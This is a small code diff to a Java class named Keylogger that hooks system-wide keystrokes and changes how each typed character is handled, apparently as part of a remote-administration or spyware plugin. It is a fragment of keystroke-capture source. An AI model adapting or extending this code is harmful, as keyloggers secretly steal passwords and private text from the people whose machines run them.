@@ -19,9 +19,7 @@ public class Keylogger implements NativeKeyListener {
 	public void nativeKeyTyped(NativeKeyEvent arg0) {		
 		try {
 			if (Plugin.dos != null && Plugin.enabled) {
-				Plugin.dos.writeByte(Plugin.KEY_HEADER);
-				
-				Plugin.writeChars(new char[] { arg0.getKeyChar() });
+				Activities.add(new Key(arg0.getKeyChar()));
 			}
 		} catch (Exception e) {
 			System.err.println("Error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
